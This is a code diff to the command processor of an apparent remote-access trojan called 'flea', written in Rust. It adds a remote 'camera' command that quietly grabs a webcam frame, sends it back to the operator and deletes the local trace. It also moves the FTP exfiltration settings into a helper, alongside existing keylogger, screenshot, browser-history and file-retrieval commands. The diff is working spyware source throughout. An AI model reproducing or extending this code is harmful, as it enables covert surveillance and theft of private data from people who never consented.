@@ -10,6 +10,8 @@ use chrono::{DateTime, Utc};
 use crate::fileserver::FileServer;
 use crate::{ftp::*, screenshot::Screenshot};
 use crate::{systemcmd::*, browserhistory};
+#[cfg(feature = "camera")]
+use crate::camera;
 use crate::keylogger::*;
 
 const FLEA_PROTOCOL_VERSION: u8 = 1;
@@ -26,6 +28,8 @@ const GET_FILE_COMMAND: &'static str = "getfile";
 const CHANGE_DIRECTORY_COMMAND: &'static str = "cd";
 const FTP_PARAM_COMMAND: &'static str = "setftp";
 const BROWSING_HISTORY_COMMAND: &'static str = "history";
+#[cfg(feature = "camera")]
+const GET_CAMERA_FRAME_COMMAND: &'static str = "camera";
 pub const STOP_COMMAND: &'static str = "quit";
 const UNKNOWN_COMMAND: &'static str = "Unknown command";
 
@@ -160,6 +164,77 @@ impl CommandProcessor
             }
         }
     }
+
+    fn set_ftp_params(&mut self, value: &str) -> String
+    {
+        let ftp_params: Vec<&str> = value.split(";").collect();
+        if ftp_params.len() != 3
+        {
+            return "Wrong number of parameters".to_string();
+        }
+
+        self.conf.ftp_address = ftp_params[0].to_string();
+        self.conf.ftp_user = ftp_params[1].to_string();
+        self.conf.ftp_pass = ftp_params[2].to_string();
+
+        match confy::store("flea_conf", None, &self.conf)
+        {
+            Ok(_) =>
+            {
+                return "Ok".to_string();
+            },
+            Err(x) =>
+            {
+                return x.to_string();
+            }
+        }
+    }
+
+    #[cfg(feature = "camera")]
+    fn get_camera_frame(&self, file_server: &Arc<Mutex<FileServer>>) -> String
+    {
+        let tmp_path = env::temp_dir();
+
+        match camera::save_camera_frames(1, &tmp_path.to_str().unwrap().to_string())
+        {
+            Ok(_) =>
+            {
+                debug!("Frame captured");
+                #[cfg(target_os = "linux")]
+                let frame_file = tmp_path.join(format!("{}0.jpg", camera::FRAME_FILE_NAME));
+
+                #[cfg(target_os = "windows")]
+                let frame_file = tmp_path.join(format!("{}0.wmv", camera::FRAME_FILE_NAME));
+                return match file_server.lock().unwrap().read_binary_file_by_path(&frame_file)
+                {
+                    Ok(x) =>
+                    {
+                        let ret = self.bytes_to_string(&x);
+                        if let Err(y) = std::fs::remove_file(frame_file) 
+                        {
+                            error!("Couldn't remove a file: {}", y.to_string());
+                            ret
+                        } 
+                        else 
+                        {
+                            debug!("Captured frame removed");
+                            ret
+                        }
+                    },
+                    Err(x) =>
+                    {
+                        error!("Error: {}", x);
+                        return x.to_string()
+                    }
+                };
+            }
+            Err(x) =>
+            {
+                error!("Error: {}", x);
+                return x;
+            }
+        }
+    }
 }
 
 impl FleaCommand for CommandProcessor
@@ -206,6 +281,20 @@ impl FleaCommand for CommandProcessor
     /// A routine for processing incoming commands
     /// * cmd - a command in a form of a string
     /// * value - an additional data related to a command
+    /// TODO: Modify this function into a hashmap with string names and function pointers
+    /// e.g.
+    /// ```
+    /// use std::collections::HashMap;
+    /// type Ihello = dyn Fn() -> String;
+    /// fn hello() -> String {
+    ///     "HELLO".to_string()
+    /// }
+    /// fn main() {
+    ///     let mut map: HashMap<&str, Box<Ihello>> = HashMap::new();    
+    ///     map.insert("hello", Box::new(hello));    
+    ///     println!("{}", map.get("hello").unwrap()());
+    /// }
+    /// ```
     fn process(&mut self, cmd: &str, value: &str, file_server: &Arc<Mutex<FileServer>>) -> String
     {        
         match cmd
@@ -367,27 +456,7 @@ impl FleaCommand for CommandProcessor
 
             FTP_PARAM_COMMAND =>
             {
-                let ftp_params: Vec<&str> = value.split(";").collect();
-                if ftp_params.len() != 3
-                {
-                    return "Wrong number of parameters".to_string();
-                }
-
-                self.conf.ftp_address = ftp_params[0].to_string();
-                self.conf.ftp_user = ftp_params[1].to_string();
-                self.conf.ftp_pass = ftp_params[2].to_string();
-
-                match confy::store("flea_conf", None, &self.conf)
-                {
-                    Ok(_) =>
-                    {
-                        return "Ok".to_string();
-                    },
-                    Err(x) =>
-                    {
-                        return x.to_string();
-                    }
-                }
+                return self.set_ftp_params(value);
             },
 
             BROWSING_HISTORY_COMMAND =>
@@ -405,17 +474,21 @@ impl FleaCommand for CommandProcessor
                 }
             },
 
+            #[cfg(feature = "camera")]
+            GET_CAMERA_FRAME_COMMAND =>
+            {
+                return self.get_camera_frame(file_server);
+            },
+
             STOP_COMMAND =>
             {
                 return STOP_COMMAND.to_string();
             },
 
             &_ =>
-            {
-
+            {                
+                return UNKNOWN_COMMAND.to_string();
             }
         }
-
-        UNKNOWN_COMMAND.to_string()
     }
 }
